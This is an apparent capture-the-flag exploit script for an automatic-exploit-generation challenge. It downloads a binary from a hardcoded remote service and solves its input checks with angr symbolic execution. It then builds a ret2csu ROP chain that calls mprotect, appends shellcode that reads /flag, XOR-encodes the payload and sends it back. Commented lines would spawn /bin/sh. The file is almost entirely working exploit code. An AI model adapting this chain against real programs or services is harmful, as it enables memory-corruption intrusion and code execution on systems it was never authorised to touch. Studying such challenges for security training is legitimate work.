__author__ = "polaris"
import re
import sys
import angr
import claripy
import subprocess
import os
from multiprocessing import Process,Manager
from pwn import *
import xdd
import logging
logging.getLogger('angr').setLevel('CRITICAL')

context.arch = 'amd64'
enc = []
buf_addr = 0


def hack3(p, to_find,index,return_dict):
    f = to_find[index]
    t = to_find[index+1]
    #print index,f,t
    #Set up the state for the function we want to solve
    e = p.factory.blank_state(addr=f)
    rdi = claripy.BVV(0, 56).concat(claripy.BVS('rdi', 8))
    rsi = claripy.BVV(0, 56).concat(claripy.BVS('rsi', 8))
    rdx = claripy.BVV(0, 56).concat(claripy.BVS('rdx', 8))
    e.regs.rdi = rdi
    e.regs.rsi = rsi
    e.regs.rdx = rdx
    #Generate a SimulationManager out of this state and explore
    sm = p.factory.simulation_manager(e)
    sm.explore(find=t)
    #Save the solutions
    found = sm.found[0]
    t1 = found.solver.eval(rdi)
    t2 = found.solver.eval(rsi)
    t3 = found.solver.eval(rdx)
    return_dict[index] = [t1,t2,t3]

def find_func(filename):
    os.system("cp "+filename+" a.elf")
    os.system("objdump -d a.elf > a.txt")
    os.system("cat a.txt | grep call > aa.txt")
    code = open("a.txt","rb").read()
    call = open("aa.txt","rb").read().split("\n")
    func = []
    for i in range(len(call)-2):
        if "puts" in call[i] and "puts" in call[i+2] and "sscanf" not in call[i+1]:
            tmp = call[i+1]
            main_addr = int(tmp[tmp.index("callq")+5:tmp.index("callq")+15].strip(" <"),16)
            break
    ttt = main_addr
    func.append(main_addr)
    for i in range(20):
        tmp = code[code.index(hex(main_addr)[2:]+":"):]
        tmp = int(tmp[tmp.index("call")+5:tmp.index("call")+14],16)
        main_addr = tmp
        func.append(main_addr)

    fff = hex(ttt)[2:]+":"
    tmp = code[code.index(fff):].split("\n")
    global enc
    for i in tmp:
        if "xor" in i:
            aaa = i[i.index("83 f0 ")+6:i.index("83 f0 ")+8]
            enc.append(int(aaa,16))
            if len(enc)==2:
                break
    print enc

    fff = hex(func[-2])[2:]+":"
    tmp = code[code.index(fff):].split("\n")
    global buf_addr
    for i in tmp:
        if "48 8d 05" in i:
            cur_addr = int(i[:i.index(":")],16)
            aaa = i[i.index("48 8d 05 ")+9:i.index("48 8d 05 ")+9+12]
            aaa = aaa.split(" ")[::-1]
            pad_addr = int("".join(aaa),16)
            buf_addr = cur_addr+pad_addr-0x33+7
            print hex(buf_addr)
            break
    return func

def ret2csu(init,call,rdi=0,rsi=0,rdx=0):
    buf  = ''
    buf += p64(init + 0x5a)
    buf += p64(0)#pop rbx
    buf += p64(1)#pop rbp
    buf += p64(call)#pop r12
    buf += p64(rdi)#pop r13
    buf += p64(rsi)#pop r14
    buf += p64(rdx)#pop r15
    buf += p64(init + 0x40)#ret
    buf  = buf.ljust(0x78,'x')
    return buf

def main(binary):
    manager = Manager()
    return_dict = manager.dict()


    to_find = find_func(binary)
    print len(to_find)
    q = angr.Project(binary, auto_load_libs=True)
    p = angr.Project(binary, auto_load_libs=True)
    ppp = []
    for i in range(16):
        ppp.append(Process(target=hack3, args=(p,to_find,i,return_dict)))
        ppp[i].start()
    a1 = xdd.solve1("a.txt",to_find[16])
    a2 = xdd.solve2("a.txt",to_find[17])
    a3 = xdd.solve3("a.txt",to_find[18])
    for i in range(16):
        ppp[i].join()

    byte_map = []
    for i in range(16):
        byte_map+=return_dict[i]
    byte_map += [a1,a2,a3]
    print byte_map


    elf = ELF(binary)
    addr = elf.search("usage : ./aeg").next()
    canary = elf.read(addr-0x10,8)
    print canary
    canary = [ord(d) for d in canary]
    data = byte_map + canary
    print data
    ret = elf.search("\xc3").next()
    print ret
    csu = elf.search("L\x89\xFAL\x89\xF6D\x89\xEFA\xFF\x14\xDCH\x83\xC3\x01H9\xDDu\xEAH\x83\xC4\x08[]A\A]A^A_\xC3").next()-0x40
    print csu

    ret_array = [ord(ccc) for ccc in p64(ret)]
    payload = data+ret_array*36

    aaaaa = ret2csu(csu, elf.got['mprotect'], elf.bss()&~0xfff, 0x4000, 7)
    aaaaa += p64(buf_addr+len(payload)+len(aaaaa)+8)
    #aaaaa += asm(shellcraft.amd64.execve('/bin/ls', ['/']))
    #aaaaa += asm(shellcraft.amd64.execve('/bin/sh',['-c', "/bin/cat", "flag"]))
    aaaaa += asm(shellcraft.amd64.open('/flag', 0) + shellcraft.amd64.read(3, elf.bss(), 0x40) + shellcraft.amd64.write(1, elf.bss(), 0x40))
    aaaaa = [ord(ccc) for ccc in aaaaa]

    payload  = payload + aaaaa
    for i in range(len(payload)):
        if i&1:
            payload[i]^=enc[1]
        else:
            payload[i]^=enc[0]

    res = ''.join(map(chr, payload)).encode('hex')
    return res

if __name__ == '__main__':
    io = remote("117.78.28.89",31094)
    context.log_level = "CRITICAL"
    io.recvuntil("wait...\n")
    data = io.recvline().strip()
    with open("sss.bin","wb") as f:
        f.write(data)
    os.system("base64 -d sss.bin | gunzip > sss.elf")
    res = main("sss.elf")
    context.log_level = "DEBUG"
    io.sendline(res)
    io.interactive()
"""
if __name__ == "__main__":
    print main(sys.argv[1])
"""
